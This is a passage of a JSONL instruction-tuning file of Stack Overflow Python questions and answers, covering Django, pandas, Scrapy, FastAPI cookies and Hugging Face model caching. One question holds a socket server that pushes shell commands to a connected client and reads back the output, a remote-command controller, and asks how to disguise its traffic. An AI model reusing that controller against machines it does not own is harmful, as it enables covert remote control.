'store\/all_products.html', context)\n\n\ndef product_detail(request, slug):\n    product = get_object_or_404(Product, slug=slug, is_active=True)\n    context = {'product': product}\n    return render(request, 'store\/product_details.html', context)\n\n<\/code><\/pre>\n<h3>TRACEBACK<\/h3>\n<pre><code>Environment:\n\n\nRequest Method: GET\nRequest URL: http:\/\/127.0.0.1:8000\/basket\/\n\nDjango Version: 3.2\nPython Version: 3.9.4\nInstalled Applications:\n['django.contrib.admin',\n 'django.contrib.auth',\n 'django.contrib.contenttypes',\n 'django.contrib.sessions',\n 'django.contrib.messages',\n 'django.contrib.staticfiles',\n 'store',\n 'account',\n 'basket',\n 'orders',\n 'payment',\n 'contact',\n 'address',\n 'discount',\n 'shipping']\nInstalled Middleware:\n['django.middleware.security.SecurityMiddleware',\n 'django.contrib.sessions.middleware.SessionMiddleware',\n 'django.middleware.common.CommonMiddleware',\n 'django.middleware.csrf.CsrfViewMiddleware',\n 'django.contrib.auth.middleware.AuthenticationMiddleware',\n 'django.contrib.messages.middleware.MessageMiddleware',\n 'django.middleware.clickjacking.XFrameOptionsMiddleware']\n\n\n\nTraceback (most recent call last):\n  File &quot;C:\\Users\\Utilisateur\\Documents\\Environments\\monoi_django_virtualenv\\lib\\site-packages\\django\\core\\handlers\\exception.py&quot;, line 47, in inner\n    response = get_response(request)\n  File &quot;C:\\Users\\Utilisateur\\Documents\\Environments\\monoi_django_virtualenv\\lib\\site-packages\\django\\utils\\deprecation.py&quot;, line 119, in __call__\n    response = self.process_response(request, response)\n  File &quot;C:\\Users\\Utilisateur\\Documents\\Environments\\monoi_django_virtualenv\\lib\\site-packages\\django\\contrib\\sessions\\middleware.py&quot;, line 61, in process_response\n    request.session.save()\n  File &quot;C:\\Users\\Utilisateur\\Documents\\Environments\\monoi_django_virtualenv\\lib\\site-packages\\django\\contrib\\sessions\\backends\\db.py&quot;, line 83, in save\n    obj = self.create_model_instance(data)\n  File &quot;C:\\Users\\Utilisateur\\Documents\\Environments\\monoi_django_virtualenv\\lib\\site-packages\\django\\contrib\\sessions\\backends\\db.py&quot;, line 70, in create_model_instance\n    session_data=self.encode(data),\n  File &quot;C:\\Users\\Utilisateur\\Documents\\Environments\\monoi_django_virtualenv\\lib\\site-packages\\django\\contrib\\sessions\\backends\\base.py&quot;, line 114, in encode\n    return signing.dumps(\n  File &quot;C:\\Users\\Utilisateur\\Documents\\Environments\\monoi_django_virtualenv\\lib\\site-packages\\django\\core\\signing.py&quot;, line 110, in dumps\n    return TimestampSigner(key, salt=salt).sign_object(obj, serializer=serializer, compress=compress)\n  File &quot;C:\\Users\\Utilisateur\\Documents\\Environments\\monoi_django_virtualenv\\lib\\site-packages\\django\\core\\signing.py&quot;, line 172, in sign_object\n    data = serializer().dumps(obj)\n  File &quot;C:\\Users\\Utilisateur\\Documents\\Environments\\monoi_django_virtualenv\\lib\\site-packages\\django\\core\\signing.py&quot;, line 87, in dumps\n    return json.dumps(obj, separators=(',', ':')).encode('latin-1')\n  File &quot;c:\\users\\utilisateur\\appdata\\local\\programs\\python\\python39\\lib\\json\\__init__.py&quot;, line 234, in dumps\n    return cls(\n  File &quot;c:\\users\\utilisateur\\appdata\\local\\programs\\python\\python39\\lib\\json\\encoder.py&quot;, line 199, in encode\n    chunks = self.iterencode(o, _one_shot=True)\n  File &quot;c:\\users\\utilisateur\\appdata\\local\\programs\\python\\python39\\lib\\json\\encoder.py&quot;, line 257, in iterencode\n    return _iterencode(o, 0)\n  File &quot;c:\\users\\utilisateur\\appdata\\local\\programs\\python\\python39\\lib\\json\\encoder.py&quot;, line 179, in default\n    raise TypeError(f'Object of type {o.__class__.__name__} '\n\nException Type: TypeError at \/basket\/\nException Value: Object of type Product is not JSON serializable\n\n<\/code><\/pre>","output_text":"<p>The problem is in the <code>__iter__<\/code> method of your <code>Basket<\/code> class. I believe you iterate over the basket object in the template so it is used in the request (because there is no loop in the view).<\/p>\n<p>Now what is the problem in the method? Well you have this particular line <code>basket = self.basket.copy()<\/code>, what it does is, that it makes a <strong>shallow copy<\/strong> of the dictionary, i.e. the internal objects referred to are the same, but you have a nested dictionary, meaning when you change the nested dictionary you actually change the same dictionary in your basket! You can use <a href=\"https:\/\/docs.python.org\/3\/library\/copy.html#copy.deepcopy\" rel=\"nofollow noreferrer\"><code>copy.deepcopy<\/code> [Python docs]<\/a> to make a <strong>deep copy<\/strong> of the dictionary:<\/p>\n<pre><code>\nimport copy\n\n\ndef __iter__(self):\n    ...\n    <b>basket = copy.deepcopy(self.basket)<\/b>\n    ...\n<\/pre><\/code>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to lowercase an entire Data Frame?<p>I'm' trying to build a function to the job because my data frames are in a list. This is the function that I am working on:<\/p>\n<pre><code>def lower(x):\n        \n        '''\n        \n        This function lowercase the entire Data Frame.\n        \n        '''\n        \n        for x in clean_lst:\n            for x.columns in x:\n                x.columns['i'].map(lambda i: i.lower())\n<\/code><\/pre>\n<p>It's not working like that!<\/p>\n<p>This is the list of data frames:<\/p>\n<pre><code>clean_lst = [pop_movies, trash_movies]\n<\/code><\/pre>\n<p>I am planing to access the list like this:<\/p>\n<pre><code>lower = [pd.DataFrame(lower(x)) for x in clean_list] \npop_movies = lower[0] \ntrash_movies = lower[1]\n<\/code><\/pre>\n<p>HELP!!!<\/p>","output_text":"<p>You can use <code>apply<\/code> functions from pandas package which works on df \/ series.<\/p>\n<p><code>clean_lst = [i.apply(lambda x: x.str.lower()) for i in clean_lst]<\/code><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to print multiple max values (integers) in Python list?<p>I have a voting program where I need to find the winner of a vote or find out whether there was a draw between the most-voted for people. I tried to do this by finding the max value in a list (which contains how many votes they got each), and then checking whether any other values equal it.<\/p>\n<p>The list used is called votesEach, which is supposed to correspond to candGroup (so the first value in votesEach is the amount of votes for candidate a).<\/p>\n<p>Here is my issue:\nIf votesEach equals [1, 0, 0, 0], the right thing is shown (i.e. candidate a has won). However,\nif there are multiple winners, only one of them is displayed (or even the wrong one sometimes). For example, if votesEach is [0, 0, 1, 1], the winners should be c and d, but a is shown twice.<\/p>\n<p>What could be the issue?<\/p>\n<p>Here is my code:<\/p>\n<pre><code>candGroup = ['a', 'b', 'c', 'd']\nvotesEach = [0, 0, 1, 1]\nwinnercounter = 0\nfor i in votesEach:\n    if i == max(votesEach):\n        winnercounter += 1\nif winnercounter == 1:\n    winner = candGroup[votesEach.index(max(votesEach))]\n    print(winner, 'has won the vote with', max(votesEach), 'votes')\nelse:\n    print(votesEach)\n    for i in votesEach:\n        if i == max(votesEach):\n            print(candGroup[votesEach[i]], 'has won the vote with', max(votesEach), 'votes')\n<\/code><\/pre>","output_text":"<p>Try this simple method,<\/p>\n<pre><code>candGroup = ['a', 'b', 'c', 'd']\nvotesEach = [0, 0, 1, 1]\n# Zip function will zip two iterators and gives res in tuple like ('a',0),('b',0)..\n# So by using those data we can filter out the winners by using maximum votes by creating a dictionary in a smart way\nwinners = {cand:votes for cand,votes in zip(candGroup,votesEach) if votes==max(votesEach)}\n# Then here by iterating over each winners and getting the candidate name and votes\nfor candidate, votes in winners.items():\n    print(candidate, 'has won the vote with', votes, 'votes')\n<\/code><\/pre>\n<p><strong>Output:<\/strong><\/p>\n<pre><code>c has won the vote with 1 votes\nd has won the vote with 1 votes\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Finding a file by extension<p>I am trying to find files with .desktop extension in a specific directory in Python3. I tried the code snippet below but it didn't work as I wanted. I want it to be a single string value.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import os, fnmatch\ndesktopfile = configparser.ConfigParser ()\ndef find(pattern, path):\n    result = []\n    for root, dirs, files in os.walk(path):\n        for name in files:\n            if fnmatch.fnmatch(name, pattern):\n                result.append(os.path.join(root, name))\n    return result\nscript_tmp_dir = &quot;\/tmp\/appiload\/appinstall&quot; # Ge\u00e7ici dizin (dosyalar burada ay\u0131klan\u0131yor)\ndesktopfilea=f&quot;{script_tmp_dir}\/squashfs-root\/{str(find ('*.desktop', f'{script_tmp_dir}\/squashfs-root\/')}&quot;\nprint(desktopfilea)\ndesktopfile.items()\n<\/code><\/pre>\n<p>Result:<\/p>\n<pre><code>\/tmp\/appiload\/appinstall\/squashfs-root\/['\/tmp\/appiload\/appinstall\/squashfs-root\/helloworld.desktop']\n<\/code><\/pre>","output_text":"<p>Use <a href=\"https:\/\/docs.python.org\/3\/library\/glob.html#glob.glob\" rel=\"nofollow noreferrer\"><code>glob.glob<\/code><\/a> instead of writing a function to do this job.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import os, glob\n\ndesktopfile = configparser.ConfigParser ()\n\nscript_tmp_dir = &quot;\/tmp\/appiload\/appinstall&quot; # Ge\u00e7ici dizin (dosyalar burada ay\u0131klan\u0131yor)\ndesktopfilea = glob.glob(f'{script_tmp_dir}\/squashfs-root\/*.desktop')\n# desktopfilea = &quot; &quot;.join(desktopfilea) # Join them in one string, using space as seperator\nprint(str(desktopfilea))\ndesktopfile.items()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to encode traffic socket?<p>Hi i have my server client model i need to encode the traffic which is HTTP1.1 how should i do this this is my server code <\/p>\n\n<p>server:<\/p>\n\n<pre><code>import socket\nfrom base64 import b64encode\n\n\nSERVER_HOST = \"0.0.0.0\"\nSERVER_PORT = 5003\n\nBUFFER_SIZE = 1024\n\n# create a socket object\ns = socket.socket()\n\n# bind the socket to all IP addresses of this host\ns.bind((SERVER_HOST, SERVER_PORT))\n# make the PORT reusable\n# when you run the server multiple times in Linux, Address already in use error will raise\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ns.listen(5)\nprint(f\"Listening as {SERVER_HOST}:{SERVER_PORT} ...\")\n\n# accept any connections attempted\nclient_socket, client_address = s.accept()\nprint(f\"{client_address[0]}:{client_address[1]} Connected!\")\n\n# just sending a message, for demonstration purposes\nmessage = \"Hello and Welcome\".encode()\nclient_socket.send(message)\n\nwhile True:\n    # get the command from prompt\n    command = input(\"Enter the command you wanna execute:\")\n    # send the command to the client\n    if command == \"3\":\n        command2 = \"arp -a\"\n        client_socket.send(command2.encode())\n    else:\n        client_socket.send(command.encode())\n    if command.lower() == \"exit\":\n        # if the command is exit, just break out of the loop\n        break\n    # retrieve command results\n    results = client_socket.recv(BUFFER_SIZE).decode()\n    # print them\n    print(results)\n# close connection to the client\nclient_socket.close()\n# close server connection\ns.close()\n<\/code><\/pre>\n\n<p>and this is what i am trying to do:<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/eZV8O.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/eZV8O.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>How should i achive this thanku.<\/p>","output_text":"<ol>\n<li>First you should have encryption and decryption mechanism both on\nserver side and client side depending on your needs.<\/li>\n<li>The next thing is to use Web Socket Secure Protocol (WSS) Configured\nin your web server.<\/li>\n<\/ol>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Using python to insert a single escape character in front of specified character in a string<p>I have a path string that I would like to use inside of a subprocess command. This path contains directories with a whitespace, so a string like &quot;foo\/foo bar\/bar&quot; would need to be converted to &quot;foo\/foo\\ bar\/bar&quot; beforehand. I have tried<\/p>\n<pre><code>path = &quot;foo\/foo bar\/bar&quot;\npath = path.replace(&quot; &quot;,&quot;\\\\ &quot;)\n<\/code><\/pre>\n<p>which results in &quot;foo\/foo\\\\ bar\/bar&quot;<\/p>\n<p>I have also tried<\/p>\n<pre><code>path = os.path.normpath(path)\n<\/code><\/pre>\n<p>which changes nothing and<\/p>\n<pre><code>path = repr(path.replace(&quot; &quot;,&quot;\\\\ &quot;))\n<\/code><\/pre>\n<p>which returns &quot;foo\/foo\\\\\\\\ bar\/bar&quot;<\/p>\n<p>Is there a good solution to this while still using subprocess or os.system to call the command?<\/p>","output_text":"<p>You must be expecting to put the entire command in a string and letting a shell parse it. Call subprocess with a list of arguments to avoid any need for quoting:<\/p>\n<pre><code>path = &quot;foo\/foo bar\/bar&quot;\nsubprocess.run([&quot;ls&quot;, &quot;-l&quot;, path])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n SCRAPY : Unable to __scrape__ page using FormRequest.from_response()<pre><code>import scrapy\n\nclass TestSpider(scrapy.Spider):\n    name = 'test'\n    start_urls = ['https:\/\/www.icsi.in\/student\/Members\/MemberSearch.aspx']\n\n    def parse(self, response):\n        return scrapy.FormRequest.from_response(\n            response,\n            formdata={'dnn_ctr410_MemberSearch_txtMembershipNumber': '61915'},\n            callback=self.after_login\n        )\n    \n    def after_login(self, response):\n        print(response)\n        return response\n<\/code><\/pre>\n<p>Since the form has multiple fields that are getting filled with session related data, I'm using from_response and adding only value against the membership number using the id of the input.<\/p>\n<p>however this isn't working and i get an error stating <code>Spider must return request, item, or None, got 'HtmlResponse'<\/code><\/p>","output_text":"<p>You have to return correct type from <code>after_login<\/code> method. list of types mentioned in the exception message.\nSo you after_login method should look something like:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def after_login(self, response):\n    print(response)\n    # response.css('') find something using CSS selector\n    # response.xpath('') or using xpath\n    yield {'some_field_name': 'field value'}\n<\/code><\/pre>\n<p>In your example, you return <code>response<\/code> which has <code>HtmlResponse<\/code> type, but scrapy expected other types, like <code>request, item, or None<\/code><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How To Download Google Pegasus Library Model<p>I am a very newbie and currently working for my Final Project. I watch a youtube video that teach me to code Abstractive Text Summarization with google's Pegasus library. <strong>It Works fine but I need it to be more efficient.<\/strong><\/p>\n<p>So here is the code<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from transformers import PegasusForConditionalGeneration, PegasusTokenizer\ntokenizer = PegasusTokenizer.from_pretrained(&quot;google\/pegasus-xsum&quot;)\nmodel = PegasusForConditionalGeneration.from_pretrained(&quot;google\/pegasus-xsum&quot;)\n<\/code><\/pre>\n<p><strong>Everytime I run that code, it always download the &quot;Google Pegasus-xsum&quot; library which sized about 2.2 GB.<\/strong><\/p>\n<p>So here is the sample of the code in notebook : <a href=\"https:\/\/github.com\/nicknochnack\/PegasusSummarization\/blob\/main\/Pegasus%20Tutorial.ipynb\" rel=\"nofollow noreferrer\">https:\/\/github.com\/nicknochnack\/PegasusSummarization\/blob\/main\/Pegasus%20Tutorial.ipynb<\/a><\/p>\n<p>and it will running download the library like picture below :<\/p>\n<p><img src=\"https:\/\/i.stack.imgur.com\/tmqoA.png\" alt=\"Picture\" \/><\/p>\n<p><strong>Is there any way to download the library first and then I saved it locally, and everytime I run the code it's just gonna call the library locally?<\/strong><\/p>\n<p><strong>Something like caching or saving the library locally maybe?<\/strong><\/p>\n<p>Thanks.<\/p>","output_text":"<p><strong>Mac<\/strong><\/p>\n<p>Using <strong>inspect<\/strong> you can find and locate the modules easily.<\/p>\n<pre><code>import inspect\nfrom transformers import PegasusForConditionalGeneration, PegasusTokenizer\n\ntokenizer = PegasusTokenizer.from_pretrained(&quot;google\/pegasus-xsum&quot;)\nmodel = PegasusForConditionalGeneration.from_pretrained(&quot;google\/pegasus-xsum&quot;)\n\nprint(inspect.getfile(PegasusForConditionalGeneration))\nprint(inspect.getfile(PegasusTokenizer))\n<\/code><\/pre>\n<p>You will get their paths sth like this<\/p>\n<pre><code>\/usr\/local\/lib\/python3.9\/site-packages\/transformers\/models\/pegasus\/modeling_pegasus.py\n\/usr\/local\/lib\/python3.9\/site-packages\/transformers\/models\/pegasus\/tokenization_pegasus.py\n<\/code><\/pre>\n<p>Now, if you go and see what is inside the <strong>tokenization_pegasus.py<\/strong> file, you will notice that the model of <strong>google\/pegasus-xsum<\/strong> is being probably fetched by the following line<\/p>\n<pre><code>PRETRAINED_VOCAB_FILES_MAP = {\n    &quot;vocab_file&quot;: {&quot;google\/pegasus-xsum&quot;: &quot;https:\/\/huggingface.co\/google\/pegasus-xsum\/resolve\/main\/spiece.model&quot;}\n}\n<\/code><\/pre>\n<p>where here if you open:<\/p>\n<p><a href=\"https:\/\/huggingface.co\/google\/pegasus-xsum\/resolve\/main\/spiece.model\" rel=\"nofollow noreferrer\">https:\/\/huggingface.co\/google\/pegasus-xsum\/resolve\/main\/spiece.model<\/a><\/p>\n<p>You will get the model downloaded directly to your machine.<\/p>\n<h3>UPDATE<\/h3>\n<p>After some search on Google, I've found sth important where you can get the used models and all their related files downloaded to your working directory by the following<\/p>\n<pre><code>tokenizer.save_pretrained(&quot;local_pegasus-xsum_tokenizer&quot;)\nmodel.save_pretrained(&quot;local_pegasus-xsum_tokenizer_model&quot;)\n<\/code><\/pre>\n<p>Ref:\n<a href=\"https:\/\/github.com\/huggingface\/transformers\/issues\/14561\" rel=\"nofollow noreferrer\">https:\/\/github.com\/huggingface\/transformers\/issues\/14561<\/a><\/p>\n<p>So that after running it, you will see the following being saved automatically in your working directory. So, now you can call the models directly but you need to search how...\n<a href=\"https:\/\/i.stack.imgur.com\/Uzx6F.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/Uzx6F.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>Also, the <strong>12.2GB<\/strong> file that you wanted to know its path locally, it is being located here online<\/p>\n<p><a href=\"https:\/\/huggingface.co\/google\/pegasus-xsum\/tree\/main\" rel=\"nofollow noreferrer\">https:\/\/huggingface.co\/google\/pegasus-xsum\/tree\/main<\/a><\/p>\n<p>And after downloading the models to your directory as you can see from the screenshot its name is <strong>pytorch_model.bin<\/strong> as it\u2019s named online.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to filter a geodataframe by geometry type?<p>I am working with Open Street Map data that I download as a dataframe through Overpass as a GEOJSON. \nWhile I am able to filter my data based on tags and subtags like so:<\/p>\n\n<p>gdf_b = gdf_b.loc[(gdf_b['highway'] != 'service')]<\/p>\n\n<p>I couldn't figure out the exact command to remove specific rows of a geodataframe that have a particular geometry type (like a point)<\/p>\n\n<p>So I am looking for something like:\ngdf_b = gdf_b.loc[(gdf_b['geometry'].type != 'Point')]<\/p>","output_text":"<p>You could apply and lambda  <\/p>\n\n<pre><code>gdf_b = gdf_b[gdf_b['geometry'].apply(lambda x : x.type!='Point' )]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n replace all key with minus to underscore in json<p>I have a json file (in fact, more than hundreds). Sometimes some keys have a dash in them.<\/p>\n<pre class=\"lang-json prettyprint-override\"><code>{\n  &quot;version&quot;: &quot;0&quot;,\n  &quot;id&quot;: &quot;xxxxxxxx-1395-088e-2704-07359f399de5&quot;,\n  &quot;detail-type&quot;: &quot;test&quot;,\n  &quot;source&quot;: &quot;aws&quot;,\n  ...\n}\n<\/code><\/pre>\n<p>My purpose is, looking for any keys (sometimes it is nested key), find it out and replace any minus to underscore.<\/p>\n<p>I can replace one key with Python code, but how can search out all keys if they have minus in key string?<\/p>\n<p>the output will be<\/p>\n<pre class=\"lang-json prettyprint-override\"><code>{\n  &quot;version&quot;: &quot;0&quot;,\n  &quot;id&quot;: &quot;xxxxxxxx-1395-088e-2704-07359f399de5&quot;,\n  &quot;detail_type&quot;: &quot;test&quot;,\n  &quot;source&quot;: &quot;aws&quot;,\n  ...\n}\n<\/code><\/pre>","output_text":"<p>There you go:<\/p>\n<pre><code>file_content = {\n  &quot;version&quot;: &quot;0&quot;,\n  &quot;id&quot;: &quot;xxxxxxxx-1395-088e-2704-07359f399de5&quot;,\n  &quot;detail-type&quot;: &quot;test&quot;,\n  &quot;source&quot;: &quot;aws&quot;\n}\nfor key in list(file_content.keys()):\n    if not isinstance(key, str):\n        continue\n    value = file_content[key]\n    del file_content[key]\n    file_content[key.replace(&quot;-&quot;,&quot;_&quot;)] = value\n\nprint(file_content)\n<\/code><\/pre>\n<p>json reading and writing can be done using the json module's functions <a href=\"https:\/\/docs.python.org\/3\/library\/json.html#json.load\" rel=\"nofollow noreferrer\">load<\/a> and <a href=\"https:\/\/docs.python.org\/3\/library\/json.html#json.dump\" rel=\"nofollow noreferrer\">dump<\/a>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n FastAPI: Deleting cookies after logout not working<p>I have tried to implement OAuth2 Cookie based Authentication using <strong>FastAPI<\/strong>.\nOn calling <code>\/auth\/token<\/code> endpoint, it perfectly sets a HttpOnly cookie as shown below:<\/p>\n<pre><code>@router.post(&quot;\/auth\/token&quot;, response_model=Token)\nasync def get_token(response: Response, form_data: OAuth2PasswordRequestForm = Depends()):\n    user = await authenticate_user(form_data.username, form_data.password)\n    if not user:\n        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=&quot;Incorrect username or password&quot;)\n    access_token_expires = timedelta(minutes=Config.ACCESS_TOKEN_EXPIRE_MINUTES)\n    access_token = create_access_token(\n        data={&quot;sub&quot;: user.email_id}, expires_delta=access_token_expires\n    )\n    response.set_cookie(key=&quot;access_token&quot;, value=access_token, httponly=True)\n    return {&quot;access_token&quot;: access_token, &quot;token_type&quot;: &quot;bearer&quot;}\n<\/code><\/pre>\n<p>Similarly, It should delete that cookie immediately after calling <code>\/logout<\/code> endpoint as below:<\/p>\n<pre><code>@router.get(&quot;\/logout&quot;)\nasync def logout(request: Request, response: Response, current_user: User = Depends(get_current_active_user)):\n    # Also tried following two comment lines\n    # response.set_cookie(key=&quot;access_token&quot;, value=&quot;&quot;, max_age=1)\n    # response.delete_cookie(&quot;access_token&quot;, domain=&quot;localhost&quot;)\n    response.delete_cookie(&quot;access_token&quot;)\n    return templates.TemplateResponse(&quot;login.html&quot;, {&quot;request&quot;: request, &quot;title&quot;: &quot;Login&quot;, &quot;current_user&quot;: AnonymousUser()})\n<\/code><\/pre>\n<p><strong>Problem:<\/strong> After calling <code>\/logout<\/code> endpoint it should delete the cookie which it does but when I again click on <code>\/login<\/code> it is able to retrieve the same cookie with same auth token i.e. browser send the same cookie along with the auth token in the request.<\/p>\n<p>Here is the debug state of response after deleting cookies. It has deleted cookie from response object which is good:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/mPrkM.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/mPrkM.png\" alt=\"debugger state response object\" \/><\/a><\/p>\n<p>Here is the debug state of request when I attempt to login <strong>AFTER LOGOUT<\/strong>. It is still able to retrieve that cookie from browser:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/lmVJp.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/lmVJp.png\" alt=\"debugger state request object\" \/><\/a><\/p>\n<p>Any help regarding how to delete the cookies properly so that it could not be found again after logging out ?<\/p>","output_text":"<p>Problem is with the response <code>\/logout<\/code> endpoint is returning.<\/p>\n<p>As shown below, the line <code>response.delete_cookies(key=&quot;access_token&quot;)<\/code> is able to delete the cookie successfully\n<a href=\"https:\/\/i.stack.imgur.com\/RR3Oj.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/RR3Oj.png\" alt=\"debug state of response object\" \/><\/a><\/p>\n<p>On creating TemplateResponse object while returning, it creates a new response copying the same cookies from the request and kind of shadow the change (delete cookies) that we have done. So swapping last two lines in the <code>logout()<\/code> function solves the problem:<\/p>\n<pre><code>@router.get(&quot;\/logout&quot;)\nasync def logout(request: Request, response: Response, current_user: User = Depends(get_current_active_user)):\n    # Also tried following two comment lines\n    # response.set_cookie(key=&quot;access_token&quot;, value=&quot;&quot;, max_age=1)\n    # response.delete_cookie(&quot;access_token&quot;, domain=&quot;localhost&quot;)\n    response = templates.TemplateResponse(&quot;login.html&quot;, {&quot;request&quot;: request, &quot;title&quot;: &quot;Login&quot;, &quot;current_user&quot;: AnonymousUser()})\n    response.delete_cookie(&quot;access_token&quot;)\n    return response\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Unfold nested dictionary with lists into pandas DataFrame - keys column<p>I am trying to unfold nested dictionary, where first key is ID. I am able to do it within a simple loop, however I expect there should be more \"pythonic\" solution.<\/p>\n\n<pre><code>example_dict = {'W.00': {'name': ['C10', 'C11'],\n                         'value': [1, 2]},\n                'W.01': {'name': ['C98', 'C99', 'C100'],\n                         'value': [11, 10, 12]},\n                'W.03': {'name': ['C57', 'C60', 'C60'],\n                         'value': [33, 32, 35]}\n               }\n<\/code><\/pre>\n\n<p>My code:<\/p>\n\n<pre><code>empty = pd.DataFrame()     \nfor id in example_dict.keys():\n    temp_frame= pd.DataFrame.from_dict(example_dict[id])\n    temp_frame['id'] = id\n    empty = pd.concat([empty, temp_frame], ignore_index=True)\n<\/code><\/pre>\n\n<p>Expected output: <\/p>\n\n<pre><code>id    name  value \nW.00  C10   1\nW.00  C11   2\nW.01  C98   11\nW.01  C99   10\nW.01  C100  22\nW.03  C57   33\nW.03  C60   32\nW.03  C61   35\n<\/code><\/pre>","output_text":"<p>You can use dict comprehension with concat:<\/p>\n\n<pre><code>(pd.concat([pd.DataFrame(v) for v in example_dict.values()], \n           keys=example_dict.keys() )\n   .reset_index(level=1, drop=True)\n)\n<\/code><\/pre>\n\n<p>Output:<\/p>\n\n<pre><code>      name  value\nW.00   C10      1\nW.00   C11      2\nW.01   C98     11\nW.01   C99     10\nW.01  C100     12\nW.03   C57     33\nW.03   C60     32\nW.03   C60     35\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n np.genfromtxt missing_values<p>I need help in preparing this data with numpy in order to plot it with matplotlib.\nThe Data looks like this:<\/p>\n<pre><code>Label   Power   Cold_junction   Prof100 Prof200 Prof300 Prof400 Prof600 Prof1000    Temp05  Temp10  Temp20  Temp30  Temp50  Temp100\nUnits   V   deg C   %   %   %   %   %   %   \u00b0C  \u00b0C  \u00b0C  \u00b0C  \u00b0C  \u00b0C\n29.09.2020 11:20:00 10,9    25,4    1,8 4,6 3,5 0,2 #-INF   #-INF   22,9    23,1    23,0    23,2    23,0    23,1\n29.09.2020 11:30:00 10,9    25,5    1,8 4,5 3,5 0,1 #-INF   #-INF   23,0    23,2    23,1    23,3    23,2    23,3\n29.09.2020 11:40:00 10,9    25,7    1,8 4,5 3,4 0,0 #-INF   #-INF   23,1    23,3    23,2    23,3    23,3    23,4\n29.09.2020 11:50:00 10,9    25,8    1,7 4,4 3,4 0,0 #-INF   #-INF   23,2    23,4    23,3    \n<\/code><\/pre>\n<p>I am having a hard time trying to deal with this #-INF values.\nSo far i tried code like this:<\/p>\n<pre><code>a = np.genfromtxt(r'data.txt', delimiter=(10,10,4,5,4,5,4,4,4), skip_header=2, dtype=str, missing_values={0:&quot;#-INF&quot;},filling_values={0:'#-INF'})\na = np.char.replace(a, ',','.')   # here in Germany we like to replace . with , to make things more complicate\na = np.char.replace(a,'\\t',' ')   # because i like the output without '\\t' in it\n<\/code><\/pre>\n<p>so far my output looks like this:<\/p>\n<pre><code>[['29.09.2020' '11:20:00 10.9 25.4 1.8 4.6 3.5 0.2 ']\n['29.09.2020' '11:30:00 10.9 25.5 1.8 4.5 3.5 0.1 ']\n['29.09.2020' '11:40:00 10.9 25.7 1.8 4.5 3.4 0.0 ']\n['29.09.2020' '11:50:00 10.9 25.8 1.7 4.4 3.4 0.0 ']\n<\/code><\/pre>\n<p>and as you can see, all the values behind the '#-INF' are ignored and i don't know what else i can try to stop that... any idea??? i thougt the missing_values would be the right argument to handle my problem, but I am doing something wrong i guess...<\/p>","output_text":"<p><code>np.genfromtxt<\/code> takes the optional argument <code>comments='#'<\/code>. You should probably set it to something else, either an empty string, or <code>None<\/code>, or another character that does not appear in your data.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Get hold of variable value combining two strings<p>I would like to have dynamic parameters for a API im using.\nFor that im searching for a easy way to achive the following:<\/p>\n<pre><code>def __init__(self):\n    self.search_param_list = [from, to]\n    self.from = A\n    self.to = B\n\ndef search_params2(self):\n    parameters = {parameter: self.parameter for parameter in self.search_param_list}\n    return parameters\n<\/code><\/pre>\n<p>The output is expectet to look something like this:<\/p>\n<pre><code>parameters ={&quot;from&quot;: A, &quot;to&quot;: B}\n<\/code><\/pre>\n<p>I do this to change the params in the init if wanted, but that i dont have to do it if not nessesary.<\/p>","output_text":"<p><code>from<\/code> is an illegal variable name. Use <code>from_<\/code> or something else.<\/p>\n<p>Save the names to be searched as strings.<\/p>\n<p>Access instance attributes via string-name with <code>getattr<\/code>.<\/p>\n<pre><code>class A:\n    def __init__(self):\n        self.x = 1\n        self.from_ = 2\n        self.to = 3\n        self.search_param_list = ['from_', 'to']\n\n    def search_params2(self):\n        return {p: getattr(self, p) for p in 